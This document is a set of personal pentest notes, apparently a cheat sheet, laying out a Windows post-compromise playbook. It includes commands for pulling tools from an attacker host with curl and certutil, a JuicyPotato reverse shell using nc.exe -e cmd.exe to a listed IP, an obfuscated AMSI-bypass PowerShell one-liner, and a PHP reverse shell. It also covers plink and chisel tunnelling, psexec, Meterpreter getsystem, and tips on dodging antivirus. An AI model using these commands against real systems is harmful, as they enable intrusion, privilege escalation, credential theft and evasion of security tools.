---
title: WINDOWS POST-COMPROMISE ATTACK STRATEGY
updated: 2023-12-08 00:40:41Z
created: 2023-09-28 09:53:49Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

# POST-COMPROMISE ATTACK STRATEGY

1.  search quick wins (**kerberoasting** , **secretsdump**, **pass the hash/password**)
2.  No quick wins? dig deep

- Enumerate (**bloodhound**)
- where does your account have access?
- old vulernabilities die hard

3.  Think outside the box (how can i move **laterally** until I can move **vertically**)

* * *

winPEAS.exe  
winPEAS.bat  
winEnum.ps1  
PowerUp.ps1

* * *

### Copy files from Kali to target using HTTP

`python3 -m http.server 80`  
Then use either curl, certutil:  
`curl http://<kali>/file.exe -o file.exe`  
`certutil -urlcache -f http://<kali>/file.exe file.exe`  
![d7bd7c5e54bf1b25fba953fff89d1c73.png](../_resources/d7bd7c5e54bf1b25fba953fff89d1c73.png)  
`$client = new-object System.Net.WebClient $client.DownloadFile("http://<kali>/file`

### Copy files from Kali to target using FTP

`python3 -m pyftpdlib -p 21 --write`

### Copy files from target to Kali

`python3 /opt/impacket/examples/smbserver.py -smb2support myshare .`

## Windows Enumeration

### System

1.  `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
2.  `wmic qfe get Caption,Description,HotFixId,InstalledOn`
3.  `wmic logicaldisk get Caption,Description,ProviderName`
4.  `type file.txt` or `more < file.txt`

### Alternate data streams

1.  `dir /R`
2.  Search for ADS  
    `gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data'`

### Users

1.  `` `whoami /priv ` ``
    
    ```
    If user has SeImpersonate privs 
    # \\192.168.119.155\test\juicy.exe -l 4444 -p c:\windows\system32\cmd.exe -a "/c  \\192.168.119.155\test\nc.exe -e cmd.exe 192.168.119.155 4447" -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}
    ```
    
2.  `whoami /groups`
    
3.  `net user` & `net user <username>`
    
4.  `net localgroup administrators`
    

### Network

1.  `ipconfig all`
2.  `arp -a`
3.  `route print`
4.  `netstat -ano`
5.  `tasklist`

### Password Hunting

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md#eop---looting-for-passwords](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords)

1.  `cmdkey /list`
2.  `c:\windows\system32\runas.exe /savecred /user:WORKGROUP\Administrator "c:\windows\system32\cmd.exe /c <command to run>""`

### Anti-Virus/Firewall

1.  `sc query windefend`
2.  `sc queryex type=service`
3.  `netsh advfirewall firewall dump` OR `netsh firewall show state`
4.  `netsh firewall show config`

### Open PowerShell from CMD.exe

`cmd> powershell -ep bypass`

`PS> sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )`

# Port Forwarding 
## PLINK.EXE

`plink.exe -l root -pw toor -R 445:127.0.0.1:445 222 10.10.16.3`

## Chisel
1. On Kali, run a reverse server to forward local ports to remote target
`sudo /home/kali/Tools/Chisel/chisel_1.9.1_linux_amd64 server -port 6666 --reverse`

2. On target, create a tunnel to a port
`\\<kali>\myshare\chisel_windows_amd64.exe client <kali>:6666 R:910:127.0.0.1:910`

### PsExec.py

1.  `psexec.py <user>:<password>@<target IP>`

### IIS PHP revsers shell

1.  When normal php (or aspx) file doesn't run. Upload nc.exe and myshell.php  
    `<?php system('nc.exe -e cmd.exe 10.10.16.3 666 ?>`

### GetSystem

`Meterpreter > getsystem`

```
0 : All techniques available
1 : Service - Named Pipe Impersonation (In Memory/Admin)
    Inject into service that runs as SYSTEM
2 : Service - Named Pipe Impersonation (Dropper/Admin)
    Drops DLL file to disk (avoid!)
3 : Service - Token Duplication (In Memory/Admin)
    Requires SeDebugPrivileges
```

**!!! Only run in memory or token, as disk can causing AV crashing**